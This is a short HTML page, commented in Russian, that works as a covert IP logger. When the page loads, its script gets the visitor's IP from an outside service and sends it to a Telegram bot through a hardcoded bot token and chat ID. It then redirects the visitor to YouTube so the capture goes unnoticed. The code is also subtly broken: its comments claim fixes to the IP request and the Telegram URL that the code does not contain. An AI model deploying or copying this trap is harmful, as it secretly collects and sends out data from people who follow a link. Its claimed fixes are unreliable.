<!DOCTYPE html>
<html>
<body style="background: #000;">
    <script>
        const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
        const CHAT_ID = "8426763446";

        async function getIp() {
            try {
                // 1. Исправлено получение IP (добавлен формат json)
                const response = await fetch('https://api.ipify.org');
                const data = await response.json();
                const ip = data.ip;

                // 2. Исправлена ссылка (добавлен /bot и $)
                const text = `Кто-то перешел по ссылке!\nIP: ${ip}`;
                await fetch(`https://api.telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

                // 3. Переход на ютуб
                window.location.href = "https://www.youtube.com"; 
            } catch (e) {
                // Если что-то пошло не так, все равно уходим на ютуб
                window.location.href = "https://www.youtube.com";
            }
        }
        getIp();
    </script>
</body>
</html>
